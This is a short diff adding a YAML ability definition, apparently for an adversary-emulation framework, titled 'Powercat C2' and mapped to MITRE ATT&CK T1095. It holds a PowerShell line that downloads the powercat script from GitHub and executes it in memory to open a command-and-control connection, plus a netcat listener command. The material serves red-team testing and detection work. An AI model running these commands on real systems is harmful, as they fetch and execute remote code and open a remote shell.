@@ -1,0 +1,19 @@
+---
+- id: 981cf81e3bb0649fafc31217c8cbc00d
+  name: Powercat C2
+  description: "Start C2 Session Using Powercat\nTo start the listener on a Linux\
+    \ device, type the following: \nnc -l -p <port>\n"
+  tactic: command-and-control
+  technique:
+    attack_id: T1095
+    name: Non-Application Layer Protocol
+  platforms:
+    windows:
+      psh:
+        command: IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1');
+          powercat -c
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
